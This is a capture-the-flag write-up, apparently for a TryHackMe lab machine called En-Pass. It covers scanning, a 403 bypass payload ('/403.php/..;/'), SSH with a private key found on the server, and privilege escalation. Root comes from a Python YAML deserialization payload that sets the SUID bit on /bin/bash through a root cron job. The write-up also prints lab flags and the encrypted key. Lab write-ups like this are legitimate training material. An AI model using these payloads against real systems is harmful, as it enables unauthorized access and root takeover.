#### 1. Scanning

```
nmap -A -T4 10.10.197.137   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 07:01 EST
Nmap scan report for 10.10.197.137
Host is up (0.21s latency).
Not shown: 982 closed ports
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)
|   256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)
|_  256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519)
161/tcp   filtered snmp
683/tcp   filtered corba-iiop
1045/tcp  filtered fpitp
1055/tcp  filtered ansyslmd
1076/tcp  filtered sns_credit
1085/tcp  filtered webobjects
1328/tcp  filtered ewall
3325/tcp  filtered active-net
5101/tcp  filtered admdog
5214/tcp  filtered unknown
7070/tcp  filtered realserver
8001/tcp  open     http         Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: En-Pass
8090/tcp  filtered opsmessaging
8654/tcp  filtered unknown
9001/tcp  filtered tor-orport
9594/tcp  filtered msgsys
20031/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.46 seconds
```

HTTP is on 8001

In the middle of a website there is `Ehvw ri Oxfn!!` ROT13 text saying `BESTOFLUCK`

In second photo, there is `U2FkCg==Z` base64 decoded text saying `Sad`


#### 2. Gobuster

```
gobuster dir -u http://10.10.249.168:8001/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50


/index.html (Status: 200)
/web (Status: 301)
/reg.php (Status: 200)
/403.php (Status: 403)
/zip (Status: 301)

```
I checked /zip and found many zip files named `a.zip...a100.zip` so I downloaded them to my machine and:

- merged all into one: `cat a*.zip > ~/merged.zip`

- unzipped merged.zip `unzip merged.zip`

- it gave me 3 other zips inside, so merged them once again

- unzipped and got a text file `a` with `sadman` inside

Unfortunately, it seems like a rabbit hole.



Secondly, I ran gobuster once again but this time hoping to find something in `/web` and it was a good idea cause it discovered `/resources`

`http://10.10.49.233:8001/web/resources`

The access is forbidden, so I do it once again and find another one:

`http://10.10.49.233:8001/web/resources/infoseek`

and again

`http://10.10.49.233:8001/web/resources/infoseek/configure`

and again

`/web/resources/infoseek/configure/key`

This is a last path as it corresponds to first question!


#### 3. Running john and accessing machine

I acccess

`/web/resources/infoseek/configure/key`

with a private key, so it is worth to crack it with john and possibly get a passphrase


```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3A3DBCAED659E70F7293FA98DB8C1802

V0Z7T9g2JZvMMhiZ6JzYWaWo8hubQhVIu3AcrxJZqFD0o2FW1K0bHGLbK8P+SaAc
9plhOtJX6ZUjtq92E/sinTG0wwc94VmwiA5lvGmjUtBjah4epDJs8Vt/tIpSTg8k
28ef1Q8+5+Kl4alJZWNF0RVpykVEXKqYw3kJBqQDTa4aH75MczJGfk4TY5kdZFO3
tPVajm46V2C/9OrjOpEVg2jIom+e4kJAaJdB7Jr7br3xoaYhe5YEUiSGM8YD7SUZ
azrAFkIoZ72iwdeVGR7CWgdwmDWw/nFvg6Ug/fsAGobDCf2CtwLEUtLL/XMpLvEb
AS0Wic1zPjCCGaVSyijImrh3beYgWbZzz7h5gmqfoycVKS4S+15tFZBZRA0wH05m
XfDw6It7ZZtP73i8XoOAg1gAbv6o/vR3GkF798bc0fV4bGJrpQ9MIEpOphR1SNuI
x0gjtCfIyYjwJmwlWeNmELyDAO3oIxYZBSydHko0EUBnbeOw+Jj3xvEdNO3PhZ7G
3UPIoZMH4KAdcXy15tL0MYGmXyOx+oHuDEPNHxkR3+lJ1C+BXJwtrSXU+qz9u/Sz
qavHdwzxc8+HiiWcGxN3LEdgfsKg/TKXA5X/TE7DnjVmhsL4IBCOIyPxF8ClXok7
YMwNymz269J85Y73gemMfhwvGC18dNs0xfYEMUtDWbrwJDsTezdBmssMvOHSjpr5
w+Z+sJvNabMIBVaQs+jqJoqm8EARNzA40CBQUJJdmqBfPV/xSmHzNOLdTspOShQN
5iwP3adKdq+/TCp2l8SaXQedMIf6DCPmcuUVrYK4pjAr7NzFVNUgqbYLT1J0thGr
gQBk+0RlQadN7m7BW835YeyvN0GKM35f7tUylJHcfTdjE832zB24iElDW483FvJy
RhM+bOBts0z+zVUx0Ua+OEM1sxwAAlruur4+ucCPFV1XrWYWfLo3VXvTbhPiZcXF
fmOJKaFxBFjbARQMR0IL5CH8tPz2Kbeaepp2sUZcgDZSHWAbvg0j8QVkisJJ/H7G
Vg6MdIRf+Ka9fPINxyrWnxDoIVqP5/HyuPjrmRN9wMA8lWub8okH9nlJoss3n8j5
xom80wK197o29NN6BWEUuagXSHdnU2o+9L991kScaC9XXOuRgqFrDRFBUUn1VOWJ
3p+lTLNscC+eMP0Be3U6R85b/o3grdb610A1V88pnDWGYa/oVgXelUh1SsHA0tuI
om679j9qdIP7O8m3PK0Wg/cSkjdj0vRxT539tAY1+ci99FXnO1Touo7mlaA4eRTK
LQLmzFcucQODcm3FEy18doT2llDTyloD2PmX+ipzB7mbdqw7pUXPyFTnGZoKrnhM
27L629aKxoM19Mz0xP8BoQMcCOCYklIw1vkaiPgXAYkNXXtBzwWn1SFcU57buaED
CJCnh3g19NZ/VjJ1zERJLjK1U1l/RtlejISAB35AYFUnKDG3iYXLRP3iT/R22BMd
z4uSYN10O1nr4EppAOMtdSdd9PJuwxKN/3nJvymMf3O/MmC/8DJOIyadZzEw7EbP
iU5caghFrCuuhCagiwYr+qeKM3BwMUBPeUXVWTCVmFkA7jR86XTMfjkD1vgDFj/8
-----END RSA PRIVATE KEY-----
```

Here is what I do step by step:

`touch id_rsa`

`chmod 655 id_rsa`

`ssh2john id_rsa > hash`

then run john:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:06 DONE (2021-02-11 10:47) 0g/s 2331Kp/s 2331Kc/s 2331KC/sa6_123..*7¡Vamos!
Session completed
```

Unfortunately, john could not find a passphrase so it is another dead end now.



#### 4. Checking `/reg.php`

I open `/reg.php` and see a field to type some value. Afterwards, I check the source and see a commented condition:

```
<?php
     

if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          
          $val = explode(",",$title);

          $sum = 0;
          
          for($i = 0 ; $i < 9; $i++){

                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {

                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
            
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
                 }

          if ( ($sum) == 9 ){
            

              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";
```

Here is what it means:

`if (!preg_match('/[a-zA-Z0-9]/i` --> if characters are NOT lowercase, uppercase, from 0-9 --> which means only special characters

`$val = explode(",",$title)`        --> characters have to be divided by comma
  
`if ( (strlen($val[0]) == 2)`       --> argument 0 needs to have 2 characters

`(strlen($val[8]) ==  3 ))`          --> argument 8 needs to have 3 characters

`$val[5] !=$val[8]`                 	--> argument 5 can't be equal to argument 8

`$val[3]!=$val[7]`                  	--> argument 3 can't be equal to argument 7
            
`$sum) == 9`                        	--> there are 9 arguments in total

It can be any combination, in my case I typed this:

`$$,$,$,!,$,$,$,$,$$$`

and got `Nice. Password : cimihan_are_you_here?`


#### 5. Checking `/403.php`

403 is an access code "Access forbidden", however according to hint, it is possible to bypass the website.

I found a tool called `403fuzzer` avaialable here `https://github.com/intrudir/403fuzzer`

and run it:

`python3 403fuzzer.py -hc 403,404 -u http://10.10.145.149:8001/403.php`

It gave lots of results, with different path lengths, however there was only one odd:

`Response Code: 200 Length: 917 Path: /403.php/..;/`

which I curl:

`curl "http://10.10.145.240:8001/403.php/..;/"`

and at the bottom of response see:

```

<h3>Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.</h3>

```


#### 6. SSH to machine

Right now we have:

- username `imsau`

- private key `id_rsa`

- passphrase `cimihan_are_you_here?`

so I ssh to machine:

`ssh -i id_rsa imsau@10.10.145.240`

and am in:

```
ssh -i id_rsa imsau@10.10.145.240
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-201-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

1 package can be updated.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


$ id 
uid=1002(imsau) gid=1002(imsau) groups=1002(imsau)
$ 
```

Afterwards, I read `user.txt`

```
ls -al
total 32
drwxr-xr-x 4 imsau imsau 4096 Jan 31 19:01 .
drwxr-xr-x 3 root  root  4096 Jan 31 19:53 ..
lrwxrwxrwx 1 root  root     9 Jan 31 19:01 .bash_history -> /dev/null
-r-------- 1 imsau imsau  220 Aug 31  2015 .bash_logout
-r-------- 1 imsau imsau 3771 Aug 31  2015 .bashrc
drwx------ 2 imsau imsau 4096 Jan 31 17:46 .cache
-rw-r--r-- 1 imsau imsau  655 Jul 12  2019 .profile
drwx------ 2 imsau imsau 4096 Jan 31 16:34 .ssh
-r-------- 1 imsau imsau   33 Jan 31 16:34 user.txt
lrwxrwxrwx 1 root  root     9 Jan 31 19:01 .viminfo -> /dev/null
$ cat user.txt
1c5ccb6ce6f3561e302e0e516c633da9
```


#### 7. Escalation to root

I found nothing with linepeas and `imsau` ahs no sudo permissions either.

After little googling, I found a tool `pspy64s` which shows crons and scripts running by all users.

So I run a python server on my machine `python3 -m http.server` then download the script on target machine `wget http://10.6.46.150:8000/pspy64s` give permissions with `chmod +x pspy64s` and run.

It shows me a script, which runs every minute as root:

```
2021/02/16 14:05:01 CMD: UID=0    PID=1822   | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2021/02/16 14:05:01 CMD: UID=0    PID=1821   | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2021/02/16 14:05:01 CMD: UID=0    PID=1820   | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2021/02/16 14:05:01 CMD: UID=0    PID=1819   | /usr/sbin/CRON -f 
2021/02/16 14:05:01 CMD: UID=0    PID=1818   | /usr/sbin/CRON -f 
```
Here is how it looks like:

```
#!/usr/bin/python
import yaml


class Execute():
        def __init__(self,file_name ="/tmp/file.yml"):
                self.file_name = file_name
                self.read_file = open(file_name ,"r")

        def run(self):
                return self.read_file.read()

data  = yaml.load(Execute().run())
```

It opens `file.yml`  in `/tmp` and then deletes it as root :)

After some googling I found yaml deserialization attack in python:

`https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf?utm_source=dlvr.it&utm_medium=twitter`

so I have to create `file.yml` which will be a suid binary giving root:

- I create `shell.yml` with `!!python/object/apply:os.system ["chmod +s /bin/bash"]`

- copy  it to `/tmp/file.yml`

- after one minute type `/bin/bash -p` to become root

- read a flag

```
$ /bin/bash -p
bash-4.3# id
uid=1002(imsau) gid=1002(imsau) euid=0(root) egid=0(root) groups=0(root),1002(imsau)
bash-4.3# cat /root/root.txt
5d45f08ee939521d59247233d3f8faf
bash-4.3# 
```


